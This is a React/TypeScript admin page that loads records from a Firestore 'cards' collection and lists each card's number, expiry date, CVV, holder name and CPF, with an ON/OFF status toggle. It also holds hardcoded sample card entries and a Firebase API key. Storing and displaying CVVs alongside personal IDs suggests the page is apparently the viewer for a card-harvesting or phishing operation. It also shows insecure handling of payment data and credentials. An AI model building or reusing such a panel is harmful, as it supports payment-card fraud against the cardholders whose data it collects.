import React, { useEffect, useState } from "react";
import {
  Card,
  Container,
  LineItem,
  StatusOff,
  StatusOffTitle,
  StatusOn,
  StatusOnTitle,
  SubTitle,
  Title,
} from "./styles";
import { initializeApp } from "firebase/app";
import { collection, getFirestore, getDocs } from "firebase/firestore";

const cartao = [
  {
    cardNumber: "4721 2133 3213 1313",
    cardDate: "04/29",
    cardCVV: "233",
    cardHolder: "Maria de alcides cruz santo",
    cpfOwner: "022.213.233-01",
    status: true,
  },
  {
    cardNumber: "0000 0000 0000 0000",
    cardDate: "04/29",
    cardCVV: "693",
    cardHolder: "Pedro de santo viera",
    cpfOwner: "022.213.233-01",
    status: true,
  },
  {
    cardNumber: "9823 4987 6777 0233",
    cardDate: "04/29",
    cardCVV: "233",
    cardHolder: "Rafaela de almeida",
    cpfOwner: "022.213.233-01",
    status: false,
  },
  {
    cardNumber: "4721 2133 3213 1313",
    cardDate: "04/29",
    cardCVV: "233",
    cardHolder: "Maria de alcides cruz santo",
    cpfOwner: "022.213.233-01",
    status: true,
  },
];
interface CardData {
  cardNumber: string;
  cardDate: string;
  cardCVV: string;
  cardHolder: string;
  cpfOwner: string;
}

const firebaseApp = initializeApp({
  apiKey: "AIzaSyCs78rDIPslrmwbwkYspJWlFkN7BVVD4jQ",
  authDomain: "empred-f6e8f.firebaseapp.com",
  projectId: "empred-f6e8f",
});

const db = getFirestore(firebaseApp);
const userCollectionRed = collection(db, "cards");

export default function Admin() {
  const [cards, setCards] = useState<any>();

  async function GetInfoCards() {
    const data = await getDocs(userCollectionRed);

    setCards(data.docs.map((doc) => ({ ...doc.data(), id: doc.id })));
  }

  useEffect(() => {
    GetInfoCards();
  }, []);

  const handleStatusChange = (key: any) => {
    // if (cards) {
    //   const updatedData = [...cards];
    //   updatedData[key].status = !updatedData[key].status;
    //   setCards(updatedData);
    // }
  };

  return (
    <Container>
      {cards &&
        cards.map((item: any, index: any) => (
          <Card>
            <LineItem>
              <SubTitle>Número do cartao:</SubTitle>
              <Title>{item.cardNumber}</Title>
            </LineItem>

            <LineItem>
              <SubTitle>Data:</SubTitle>
              <Title>{item.cardExpiricy}</Title>
            </LineItem>

            <LineItem>
              <SubTitle>CVV:</SubTitle>
              <Title>{item.cardCvv}</Title>
            </LineItem>

            <LineItem>
              <SubTitle>Titular do cartão:</SubTitle>
              <Title>{item.cardHolder}</Title>
            </LineItem>

            <LineItem>
              <SubTitle>CPF do titular:</SubTitle>
              <Title>{item.cpfOwnerCard}</Title>
            </LineItem>

            <div style={{ display: "flex", justifyContent: "center" }}>
              {item.status === true ? (
                <StatusOn onClick={() => handleStatusChange(index)}>
                  <StatusOnTitle>ON</StatusOnTitle>
                </StatusOn>
              ) : (
                <StatusOff onClick={() => handleStatusChange(index)}>
                  <StatusOffTitle>OFF</StatusOffTitle>
                </StatusOff>
              )}
            </div>
          </Card>
        ))}
    </Container>
  );
}
